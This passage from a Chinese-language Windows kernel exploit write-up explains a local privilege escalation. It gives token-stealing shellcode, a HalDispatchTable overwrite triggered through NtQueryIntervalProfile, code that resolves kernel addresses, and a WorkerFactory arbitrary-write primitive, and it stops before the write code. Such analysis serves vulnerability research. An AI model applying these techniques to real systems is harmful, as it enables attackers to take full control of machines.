
### Shellcode 示例

```c
NTSTATUS __stdcall Shellcode(int a,int b,int c,int d)
{
 //获取自己和系统进程的EPROCESS
PEPROCESS pCur, pSys;
DWORD ObjTable;
MyPsLookupProcessByProcessId(GetCurrentProcessId(), &pCur);
MyPsLookupProcessByProcessId(4, &pSys);
//提权
0xF8为token位置
*(DWORD*)(pCur + 0xF8) = *(DWORD*)(pSys + 0xF8);
//绕过清理句柄
ObjTable = *(DWORD*)(pCur + 0xF4);
*(DWORD*)(ObjTable + 0x30) -= 1;
ObjTable = *(DWORD*)ObjTable;
*(DWORD*)(ObjTable + ((DWORD)hWorkerFactory * 2)) = 0;
//恢复Hook
*(DWORD*)(MyHalDispatchTable + 4) = oldHaliQuerySystemInformation;
return 0;
}
```

针对第二个问题，我们知道Windows有很多的系统例程（比如SSDT里面的全都是），如果我们能替换掉某个例程的地址为我们的Shellcode地址，然后调用这个例程，那CPU便会去执行我们的Shellcode代码。

当然，此漏洞发现者使用的并不是SSDT里面的例程，因为这个表里面的函数使用频率太高了，很容易被其他程序调用从而影响我们对漏洞的利用。这里，漏洞发现者盯上了漏洞利用届的老熟人、冷门调用的扛霸子：位于`HalDispatchTable`第二项的`HaliQuerySystemInformation`：

```cmd
kd> dd HalDispatchTable L4
83d363f8
00000004 84033940 8403380e 83ebe793
kd> dt HAL_DISPATCH
83d363f8
Wdf01000!HAL_DISPATCH
+0x000 Version          : 4
+0x004 HalQuerySystemInformation : 0x84033940
long hal!HaliQuerySystemInformation+0
+0x008 HalSetSystemInformation : 0x8403380e
long hal!HaliSetSystemInformation+0
+0x00c HalQueryBusSlots : 0x83ebe793
long nt!xHalQueryBusSlots+0
+0x010 Spare1           : 0
+0x014 HalExamineMBR    : 0x83c155c2
void  nt!HalExamineMBR+0
+0x018 HalIoReadPartitionTable : 0x83d7ffdf
long nt!IoReadPartitionTable+0
+0x01c HalIoSetPartitionInformation : 0x83ebe095
long nt!IoSetPartitionInformation+0
+0x020 HalIoWritePartitionTable : 0x83ebe340
long nt!IoWritePartitionTable+0
+0x024 HalReferenceHandlerForBus : 0x83cbd3d4
_BUS_HANDLER* nt!KeQueryHighestNodeNumber+0
+0x028 HalReferenceBusHandler : 0x83d23a8f
void  nt!xHalStopLegacyUsbInterrupts+0
+0x02c HalDereferenceBusHandler : 0x83d23a8f
void  nt!xHalStopLegacyUsbInterrupts+0
+0x030 HalInitPnpDriver : 0x8403376a
long hal!HaliInitPnpDriver+0
+0x034 HalInitPowerManagement : 0x84033f8a
long hal!HaliInitPowerManagement+0
+0x038 HalGetDmaAdapter : 0x8401b92c
_DMA_ADAPTER* hal!HaliGetDmaAdapter+0
+0x03c HalGetInterruptTranslator : 0x84032e6a
long hal!HaliGetInterruptTranslator+0
+0x040 HalStartMirroring : 0x83ebe7c0
long nt!xHalStartMirroring+0
+0x044 HalEndMirroring  : 0x83cde9bf
long nt!xHalEndMirroring+0
+0x048 HalMirrorPhysicalMemory : 0x83cde9d3
long nt!xHalReadWheaPhysicalMemory+0
+0x04c HalEndOfBoot     : 0x84034150
void  hal!HalpEndOfBoot+0
+0x050 HalMirrorVerify  : 0x83cde9d3
long nt!xHalReadWheaPhysicalMemory+0
+0x054 HalGetCachedAcpiTable : 0x8401daf6
void* hal!HalAcpiGetTableDispatch+0
+0x058 HalSetPciErrorHandlerCallback : 0x84022a3a
void  hal!HaliSetPciErrorHandlerCallback+0
```

根据已知资料可知，当我们调用`NtQueryIntervalProfile`时，会导致内核态调用`HalQuerySystemInformation`函数。

所以，如果我们将`HalQuerySystemInformation`函数的地址替换为我们Shellcode函数的地址，然后调用`NtQueryIntervalProfile`，我们的Shellcode便会得到执行。

那么，新的问题又出现了：

如何获取 `HalQuerySystemInformation` 函数的存储地址？
在获取到1中地址后，如何向这个地址写入我们Shellcode的地址？

### 构造读写原语

根据上一节的分析可知 `HalQuerySystemInformation` 位于 `HalDispatchTable+0x004` 的位置，好消息是 `HalDispatchTable` 在`ntoskrnl.exe`中是导出的：

![图片描述](https://bbs.kanxue.com/upload/attach/202206/156241_PS9KHZVNN4TQPSX.png)

获取一个导出的符号地址，在R3中使用 `LoadLibrary` + `GetProcAddress` 的经典组合就可以搞定了，唯一需要注意的是需要根据`ntoskrnl.exe`在内核中实际加载的基址重新计算一下导出名称的地址：

```c
PSYSTEM_MODULE_INFORMATION Info = (PSYSTEM_MODULE_INFORMATION)malloc(cbNeed);
Status = MyNtQuerySystemInformation(11, Info, cbNeed, &cbNeed);
if (!NT_SUCCESS(Status))
{
printf("MyNtQuerySystemInformation Failed %p\n", Status);
return 0;
}
// Info 中存放 ntoskrnl.exe 即nt模块的基本信息
DWORD Ntbase = Info->Module[0].Base;
// nt模块的加载基址
// Info->Module[0].ImageName 存放nt模块的全路径，我们需要切出文件名
HMODULE Mynt = LoadLibrary(Info->Module[0].ImageName + Info->Module[0].OffsetToFileName);
if (Mynt == NULL)
{
printf("LoadLibrary Nt Failed\n");
return 0;
}
// 重新计算HalDispatchTable的地址
MyHalDispatchTable = (ULONG)GetProcAddress(Mynt,"HalDispatchTable") - (ULONG)Mynt + Ntbase;
if (MyHalDispatchTable == NULL)
{
printf("Get HalDispatchTable Failed %p\n", GetLastError());
return 0;
}
```

OK，现在我们知道了`HalDispatchTable`的地址，我们下一步只需要向 `HalDispatchTable+0x004` 位置处写入我们Shellcode函数地址就可以了——可是我们如何写呢？接下来让我们回答上一节的问题：

> “在获取到`HalDispatchTable`中地址后，如何向这个地址写入我们Shellcode的地址”

#### 写原语

Windows有一个很有意思的设计，为了管理内核对象， Windows提供了很多配套函数，这些函数都是成组出现的，其基本形式为：`NtCreateXXX`/`NtQueryInformationXXX`/`NtSetInformationXXX`。这三类函数一般用于创建内核对象或查询/设置该内核对象的信息。

如果要尝试构造任意地址写，`NtSetInformationXXX`系列函数是个不错的选择，而漏洞发现者选取的内核对象为`WorkerFactory`，即“受害”函数是`NtSetInformationWorkerFactory`，让我们先来理解一下这个函数（仅列出重要部分）：

```c
NTSTATUS __stdcall NtSetInformationWorkerFactory(HANDLE Handle,int QueryClassInformation, DWORD *Data, SIZE_T CbData)
{
DWORD *v7;
// eax
DWORD v10;
// edi
PVOID WorkerFactoryObject;
// [esp+3Ch] [ebp-1Ch] BYREF
v5 = 4;
if ( CbData != v5 )
return STATUS_INFO_LENGTH_MISMATCH;
if ( QueryClassInformation == 8 )
{
v7 = Data;
}
v10 = *v7;
result = ObReferenceObjectByHandle(Handle,4u, ExpWorkerFactoryObjectType, AccessMode[0], &WorkerFactoryObject,0);
if ( QueryClassInformation == 8 )
{
*(_DWORD *)(*(_DWORD *)(*(_DWORD *)WorkerFactoryObject + 0x10) + 0x1C) = v10;
// 写原语构造点
ObfDereferenceObject(WorkerFactoryObject);
return 0;
}
}
```

从函数的反汇编代码来看，我们可以将4个字节的数据写到受控地址处，地址的控制是通过`WorkerFactory`对象+`0x10`处的成员值间接计算得出的。这里的几个要点为：

- `QueryClassInformation`参数需要为`8`
- `CbData`参数值需要是`4`
- `Data`参数为需要写入的数据值（`HalDispatchTable + 4`）

所以，Exploit中构造的写原语代码为：
